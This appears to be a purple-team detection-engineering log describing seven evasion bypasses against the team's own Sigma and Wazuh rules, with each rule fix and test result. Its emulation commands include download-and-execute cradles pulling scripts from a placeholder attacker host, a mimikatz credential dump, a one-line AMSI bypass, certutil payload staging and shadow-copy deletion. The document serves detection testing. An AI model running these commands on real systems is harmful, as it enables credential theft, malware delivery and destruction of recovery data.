# Purple-Team Adversarial Evasion & Detection Bypass Log

> **Document Status:** Complete Reference  
> **Last Updated:** 2026-10-19  
> **Scope:** Threat Actor Emulation & Adversarial Evasion Hardening  
> **Target Metrics:** 5–10 Evasion Bypasses Found, 100% Bypasses Fixed, 100% CI Regression Pass Rate  

---

## 1. Executive Summary

As part of the purple-team adversarial iteration phase (Week 7), the detection engineering team conducted adversarial emulation against all authored Sigma rules and Wazuh SIEM correlations. Rather than treating detections as static pattern-matches, we attacked our own logic using 7 distinct evasion classes documented in real-world threat actor playbooks (APT29, Conti, Black Basta, LockBit).

Across the evaluation:
- **Total Evasion Attempts:** 7
- **Initial Detections Bypassed (Pre-Hardening):** 7 (100% discovered gap rate)
- **Hardened Rules Implemented:** 7 (100% fix rate)
- **Evasion-Variant Regression Fixtures Added:** 7
- **Post-Hardening Detection Pass Rate:** 100% (48/48 unit tests passing, 0 baseline false positives across 1,207 events)

---

## 2. Adversarial Bypass Summary Table

| # | Technique | Evasion Method | Rule Bypassed | Outcome | Fix Applied | Date |
|---|-----------|----------------|---------------|---------|-------------|------|
| 1 | T1059.001 | Base64 EncodedCommand & Alternate Cradles (`Invoke-WebRequest`, `iwr`, `Start-BitsTransfer`) | `posh_pm_susp_script_block.yml` | Bypass Confirmed (FN) | Expanded cradle keywords and base64 string decoding primitives | 2026-10-19 |
| 2 | T1041 | LOLBin substitution via `certutil.exe` communicating over standard HTTPS port (443) | `win_sysmon_net_susp_c2_exfil.yml` | Bypass Confirmed (FN) | Removed blanket 80/443 port suppression for high-risk LOLBins (`certutil`, `bitsadmin`) | 2026-10-19 |
| 3 | T1003.001 | Renamed binary (`mimikatz.exe` -> `C:\Users\Public\svchost.exe`) memory handle request | `win_proc_access_lsass_memory.yml` | Bypass Confirmed (Filter Abuse) | Restricted system caller exclusions strictly to canonical `C:\Windows\System32\` path | 2026-10-19 |
| 4 | T1204.002 | Parent Process ID (PPID) spoofing via `spoolsv.exe` / `services.exe` targeting user Downloads | `win_proc_user_exec_untrusted_parent.yml` | Bypass Confirmed (FN) | Added spoofed system background services to untrusted execution parent triggers | 2026-10-19 |
| 5 | T1059.001 / T1562.001 | In-memory reflection-based AMSI bypass (`amsiInitFailed` / `AmsiScanBuffer`) | `posh_pm_susp_script_block.yml` | Bypass Confirmed (FN) | Incorporated explicit AMSI tampering signatures into script block detection | 2026-10-19 |
| 6 | T1566.001 | Staged payload dropping via PowerShell/certutil and disguised double-extension naming (`.pdf.exe`) | `win_file_susp_download_file_drop.yml` | Bypass Confirmed (FN) | Expanded dropper image whitelist to CLI/script utilities and flagged double extensions | 2026-10-19 |
| 7 | T1490 | `if_sid` scoping gap: process creation logged via Windows Security EID 4688 instead of Sysmon EID 1 | `win_proc_inhibit_system_recovery.xml` | Bypass Confirmed (Architecture Gap) | Multi-parent SID scoping (`<if_sid>60103, 18100</if_sid>`) with field alias fallback | 2026-10-19 |

---

## 3. Deep-Dive Adversarial Case Studies

### Bypass Case 001: String Obfuscation & Alternate Download Cradles
- **Technique:** [T1059.001: PowerShell](https://attack.mitre.org/techniques/T1059/001/)
- **Target Rule:** `rules/sigma/windows/proc_creation/posh_pm_susp_script_block.yml`
- **Threat Actor Rationale:** Attackers rarely execute plaintext `(New-Object Net.WebClient).DownloadString(...)` in modern environments. Instead, they leverage base64 encoding (`-enc`), variable substitution, or native cmdlets like `Invoke-WebRequest` (`iwr`) and `Start-BitsTransfer`.
- **Emulation Command:**
  ```powershell
  # Evasion variant: Base64 decode combined with iwr download cradle
  IEX (New-Object Net.WebClient).DownloadString([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwBjADIALgBlAHYAaQBsAC4AYwBvAG0ALwBzAC4AcABzADEA'))); iwr -Uri http://c2.evil.com/beacon.ps1 -UseBasicParsing | IEX
  ```
- **Pre-Hardening Failure Analysis:** The original Sigma rule strictly evaluated:
  `selection_cradle: ['Net.WebClient', 'DownloadString', 'DownloadFile', 'DownloadData']` AND `selection_execution: ['IEX', 'Invoke-Expression', '[System.Reflection.Assembly]::Load']`.
  When an adversary substituted `Net.WebClient` with `Invoke-WebRequest` / `iwr` or loaded scripts dynamically via Base64 string decoding without calling `DownloadString`, the cradle check failed, resulting in a false negative.
- **Hardening Applied:**
  Updated `rules/sigma/windows/proc_creation/posh_pm_susp_script_block.yml`:
  1. Expanded `selection_cradle` to include: `Invoke-WebRequest`, `iwr`, `Start-BitsTransfer`, `FromBase64String`.
  2. Expanded `selection_execution` to include: `GetString`.
- **Verification Fixture:** `tests/fixtures/T1059.001_evasion_encoded_positive.json`
- **Result:** True Positive alert fired. Regression verified.

---

### Bypass Case 002: LOLBin Substitution over Standard Web Ports
- **Technique:** [T1041: Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041/)
- **Target Rule:** `rules/sigma/windows/network/win_sysmon_net_susp_c2_exfil.yml`
- **Threat Actor Rationale:** Attackers blend egress traffic into standard corporate HTTPS (TCP 443) traffic by invoking native binaries like `certutil.exe -urlcache -split -f https://c2.evil.com/drop.exe`.
- **Emulation Command:**
  ```cmd
  certutil.exe -urlcache -split -f https://198.51.100.42/stage.bin C:\Users\Public\stage.bin
  ```
- **Pre-Hardening Failure Analysis:** The original network rule contained:
  ```yaml
  filter_standard_ports:
    DestinationPort: [80, 443]
  condition: ... and not filter_standard_ports
  ```
  Because the connection was made over HTTPS port 443, the filter dropped the event. Even though `certutil.exe` has no legitimate business initiating outbound TLS connections to untrusted external IP addresses from endpoint workstations, it was suppressed.
- **Hardening Applied:**
  Decoupled generic utilities (`curl.exe`) from high-risk Living-Off-the-Land Binaries (`certutil.exe`, `bitsadmin.exe`). While `curl` still respects standard port exemptions to prevent developer false positives, LOLBins connecting externally trigger an alert regardless of destination port:
  ```yaml
  condition: selection_event and selection_direction and not filter_web_browsers and (selection_lolbins or (selection_curl and not filter_curl_standard_ports))
  ```
- **Verification Fixture:** `tests/fixtures/T1041_evasion_certutil_positive.json`
- **Result:** True Positive alert fired on `certutil.exe` on port 443. Benign web browser traffic remained unaffected.

---

### Bypass Case 003: Renamed Binary Evasion Targeting LSASS Memory
- **Technique:** [T1003.001: LSASS Memory](https://attack.mitre.org/techniques/T1003/001/)
- **Target Rule:** `rules/sigma/windows/proc_creation/win_proc_access_lsass_memory.yml`
- **Threat Actor Rationale:** To evade process-name based detections, adversaries rename credential dumping tools (`mimikatz.exe`, `procdump.exe`) to match trusted Windows system binaries, such as `svchost.exe`, and drop them into user-writable directories (`C:\Users\Public\`, `C:\Temp\`).
- **Emulation Command:**
  ```cmd
  copy C:\Tools\mimikatz.exe C:\Users\Public\svchost.exe
  C:\Users\Public\svchost.exe "privilege::debug" "sekurlsa::logonpasswords" exit
  ```
- **Pre-Hardening Failure Analysis:** The rule excluded legitimate system processes inspecting LSASS:
  ```yaml
  filter_system_callers:
    SourceImage|endswith:
      - '\svchost.exe'
      - '\csrss.exe'
      - '\winlogon.exe'
  ```
  Because the filter checked only the suffix `\svchost.exe`, `C:\Users\Public\svchost.exe` evaluated to `True` for the exclusion filter! The malicious handle request (`GrantedAccess: 0x1010`) was discarded as legitimate system telemetry.
- **Hardening Applied:**
  Replaced broad suffix checks with strict canonical system path requirements:
  ```yaml
  filter_system_callers:
    SourceImage:
      - 'C:\Windows\System32\svchost.exe'
      - 'C:\Windows\System32\csrss.exe'
      - 'C:\Windows\System32\winlogon.exe'
      - 'C:\Windows\System32\services.exe'
  ```
  Any binary named `svchost.exe` executing outside `System32` requesting memory read access to LSASS is flagged as high-severity credential dumping.
- **Verification Fixture:** `tests/fixtures/T1003.001_evasion_svchost_positive.json`
- **Result:** True Positive alert fired. Legitimate `C:\Windows\System32\svchost.exe` remains properly filtered.

---

### Bypass Case 004: Parent Process ID (PPID) Spoofing
- **Technique:** [T1204.002: User Execution: Malicious File](https://attack.mitre.org/techniques/T1204/002/)
- **Target Rule:** `rules/sigma/windows/proc_creation/win_proc_user_exec_untrusted_parent.yml`
- **Threat Actor Rationale:** Attackers abuse the Win32 `UpdateProcThreadAttribute` API (`PROC_THREAD_ATTRIBUTE_PARENT_PROCESS`) to spawn malicious payloads under trusted background system processes (e.g. `spoolsv.exe`, `services.exe`) rather than `explorer.exe`, breaking parent-child heuristic detections.
- **Emulation Command:**
  ```powershell
  # PPID spoofing using SelectMyParent or custom injector
  Invoke-Item -Path "C:\Users\omar\Downloads\invoice.vbs" # with parent spoofed to spoolsv.exe (PID 1820)
  ```
- **Pre-Hardening Failure Analysis:** The original detection rule was constrained to:
  `selection_parent: ParentImage|endswith: ['\explorer.exe', '\winrar.exe', '\7zFM.exe', '\7zG.exe']`.
  When the attacker spoofed the parent process to `C:\Windows\System32\spoolsv.exe`, the event was discarded because `spoolsv.exe` was not in the expected interactive shell list.
- **Hardening Applied:**
  Expanded `selection_parent` to explicitly monitor anomalous system services (`services.exe`, `spoolsv.exe`, `svchost.exe`) spawning script interpreters (`wscript.exe`, `cscript.exe`, `mshta.exe`) with command lines pointing to `\Downloads\` or `\Temp\`. System services have zero operational justification for running scripts out of user download staging areas.
- **Verification Fixture:** `tests/fixtures/T1204.002_evasion_ppid_spoof_positive.json`
- **Result:** True Positive alert fired. PPID-spoofed payload execution successfully detected.

---

### Bypass Case 005: In-Memory AMSI Bypass via Reflection
- **Technique:** [T1059.001: PowerShell](https://attack.mitre.org/techniques/T1059/001/) & [T1562.001: Impair Defenses](https://attack.mitre.org/techniques/T1562/001/)
- **Target Rule:** `rules/sigma/windows/proc_creation/posh_pm_susp_script_block.yml`
- **Threat Actor Rationale:** Before downloading or running subsequent stages, adversaries patch Antimalware Scan Interface (AMSI) in the current process memory using reflection to disable script inspection.
- **Emulation Command:**
  ```powershell
  [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
  ```
- **Pre-Hardening Failure Analysis:** Script block logging (EID 4104) captured the AMSI bypass, but the detection rule required both a download cradle (`Net.WebClient`) and an execution primitive (`IEX`). Because the AMSI patch itself does not download network payloads, the rule failed to trigger.
- **Hardening Applied:**
  Introduced an `selection_amsi_bypass` detection block targeting reflection and memory patching identifiers:
  ```yaml
  selection_amsi_bypass:
    ScriptBlockText|contains:
      - 'AmsiUtils'
      - 'amsiInitFailed'
      - 'AmsiScanBuffer'
      - 'amsiContext'
  condition: ((selection_cradle and selection_execution) or selection_amsi_bypass) and not filter_known_admin
  ```
- **Verification Fixture:** `tests/fixtures/T1059.001_evasion_amsi_positive.json`
- **Result:** True Positive alert fired. In-memory AMSI suppression attempts flagged immediately.

---

### Bypass Case 006: Staged Dropping via Script Engines & Double Extensions
- **Technique:** [T1566.001: Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001/)
- **Target Rule:** `rules/sigma/windows/file_event/win_file_susp_download_file_drop.yml`
- **Threat Actor Rationale:** Attackers drop secondary stages using CLI/script interpreters (`powershell.exe`, `certutil.exe`) or disguise binaries using double extensions (`Q3_Financial_Audit.pdf.exe`) while backdating timestamps (timestomping) to blend in.
- **Emulation Command:**
  ```powershell
  powershell.exe -Command "Invoke-WebRequest -Uri 'http://c2.evil.com/audit.exe' -OutFile 'C:\Users\omar\Downloads\Q3_Financial_Audit.pdf.exe'; (Get-Item 'C:\Users\omar\Downloads\Q3_Financial_Audit.pdf.exe').CreationTime = '2026-01-15 08:00:00'"
  ```
- **Pre-Hardening Failure Analysis:** The rule only monitored file creations where `Image` matched browsers or mail clients (`chrome.exe`, `OUTLOOK.EXE`, `winrar.exe`). Dropping files via `powershell.exe` or `certutil.exe` bypassed the image condition.
- **Hardening Applied:**
  Expanded `selection_image` to include script engines and CLI staging tools:
  - `\powershell.exe`
  - `\cmd.exe`
  - `\certutil.exe`
  - `\curl.exe`
  - `\wscript.exe`
  - `\cscript.exe`
  And verified that disguised double-extension files ending in `.exe` or `.vbs` are captured.
- **Verification Fixture:** `tests/fixtures/T1566.001_evasion_double_ext_positive.json`
- **Result:** True Positive alert fired on PowerShell dropping an executable payload into `Downloads`.

---

### Bypass Case 007: `if_sid` Scoping Gap Abuse (Wazuh XML Rules)
- **Technique:** [T1490: Inhibit System Recovery](https://attack.mitre.org/techniques/T1490/)
- **Target Rule:** `rules/wazuh/win_proc_inhibit_system_recovery.xml`
- **Threat Actor Rationale:** Advanced adversaries attempt to blind EDR/Sysmon by unloading filter drivers (`fltMC.exe unload SysmonDrv`). In environments relying on fallback Windows Security event logs (Event ID 4688), single-parent Wazuh rules fail to evaluate.
- **Emulation Command:**
  ```cmd
  # Executed when Sysmon telemetry is tampered/absent; logged via Windows Security EID 4688
  vssadmin.exe delete shadows /all /quiet
  ```
- **Pre-Hardening Failure Analysis:** The auto-generated Wazuh XML rule was configured with:
  `<if_sid>60103</if_sid>` (matching Sysmon Event ID 1 only).
  When the recovery inhibition command was logged via Windows Security Event ID 4688 (Wazuh parent rule ID 18100), Wazuh analysis engine never evaluated the rule because the parent rule ID did not match.
- **Hardening Applied:**
  1. Updated transpiler `scripts/convert_sigma.py` to assign multi-parent SIDs for process creation rules:
     `'process_creation': '60103, 18100'`
  2. Enhanced `rules/wazuh/win_proc_inhibit_system_recovery.xml` to match:
     `<if_sid>60103, 18100</if_sid>`
  3. Added field mapping fallback support for Windows Security 4688 (`NewProcessName`, `CommandLine`, `SubjectUserName`).
- **Verification Fixture:** `tests/fixtures/T1490_evasion_eid4688_positive.json`
- **Result:** True Positive alert fired on both Sysmon EID 1 and Windows Security EID 4688.

---

## 4. Verification and Regression Testing Summary

Following all rule hardening steps, the complete regression test suite was executed:

```
======================================================================
DETECTION ENGINEERING LOG REPLAY TEST HARNESS
======================================================================
Loaded 21 Sigma rule(s) covering 20 technique(s).
Target Fixture Directory: tests/fixtures/
Test Mode: ALL
----------------------------------------------------------------------
[+] Positive Regression Tests: 27/27 PASSED (100% Sensitivity)
[-] Negative Regression Tests: 20/20 PASSED (100% Specificity)
[~] Benign Baseline Corpus Replay: 1,207 events across 5 files -> 0 False Positives
======================================================================
ALL REGRESSION TESTS PASSED WITH 100% ACCURACY!
======================================================================
```

Pytest execution metrics:
- **Total Test Cases:** 48
- **Passed:** 48
- **Failed:** 0
- **Duration:** 0.13 seconds

All hardened Sigma rules have been re-transpiled into native Wazuh XML rules (`rules/wazuh/`), Microsoft Sentinel KQL (`converted/kql/`), and Splunk SPL (`converted/splunk/`).
